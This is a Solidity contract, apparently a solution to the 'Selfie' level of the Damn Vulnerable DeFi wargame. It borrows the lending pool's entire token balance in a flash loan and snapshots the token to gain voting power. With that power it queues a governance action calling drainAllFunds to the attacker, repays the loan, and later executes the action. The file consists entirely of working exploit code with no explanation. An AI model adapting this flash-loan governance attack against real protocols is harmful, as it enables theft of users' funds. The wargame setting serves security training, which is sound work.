// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePoolReceiver {
    function receiveTokens(address token, uint256 amount) external;
}

contract SelfieAttacker is ISelfiePoolReceiver {
    address private immutable owner;
    uint256 private state;
    SimpleGovernance private governance;
    SelfiePool private loanPool;
    constructor(address governanceAddress, address poolAddress) {
        owner = msg.sender;
        state = 0;
        governance = SimpleGovernance(governanceAddress);
        loanPool = SelfiePool(poolAddress);
    }

    function receiveTokens(address token, uint256 amount) override external {
        require(msg.sender == address(loanPool));
        DamnValuableTokenSnapshot(token).snapshot();
        if(state == 0) {
            // Queue action and save its id to state
            state = governance.queueAction(address(loanPool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        }
        // Send the tokens back
        require(DamnValuableTokenSnapshot(token).transfer(address(loanPool), amount));
    }

    function attack() external {
        uint256 poolBalance = loanPool.token().balanceOf(address(loanPool));
        loanPool.flashLoan(poolBalance);
    }

    function drain() external {
        governance.executeAction(state);
    }
}